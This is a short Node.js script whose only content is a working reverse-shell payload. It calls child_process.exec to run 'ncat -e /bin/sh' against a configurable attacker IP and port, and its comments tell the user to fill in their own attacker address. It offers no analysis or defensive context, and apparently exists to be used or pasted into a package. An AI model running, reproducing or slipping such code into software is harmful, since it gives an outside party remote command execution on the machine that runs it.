const { exec } = require("child_process");

const attackerIP = "192.168.191.160";  // Change this to your attacker's IP
const attackerPort = "4442";  // Change this to your attacker's port

// Use netcat to create a reverse shell connection to the attacker
exec(`ncat -e /bin/sh ${attackerIP} ${attackerPort}`, (error, stdout, stderr) => {
    if (error) {
        console.error(`exec error: ${error}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
    console.error(`stderr: ${stderr}`);
});
